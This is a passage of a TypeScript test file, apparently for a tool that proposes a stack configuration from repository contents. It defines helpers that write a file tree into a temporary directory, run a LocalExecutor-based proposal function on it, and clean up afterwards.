/**
 * Every tree below is written to a real temp directory and read through a real
 * LocalExecutor, i.e. the same `readRepoInputs` path the CLI and the setup page
 * use. The pure detector has its own tests; what is checked here is the
 * wiring: listing, bounded reads, the adapter, the digests, and the flag.
 */

type Tree = Record<string, string>;

async function materialise(tree: Tree): Promise<{ root: string; executor: LocalExecutor }> {
  const root = await mkdtemp(join(tmpdir(), "stack-propose-"));
  for (const [path, text] of Object.entries(tree)) {
    await mkdir(dirname(join(root, path)), { recursive: true });
    await writeFile(join(root, path), text);
  }
  return { root, executor: new LocalExecutor({ root }) };
}
async function propose(tree: Tree) {
  const { root, executor } = await materialise(tree);
  try {
    return await proposeFromExecutor(executor);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}

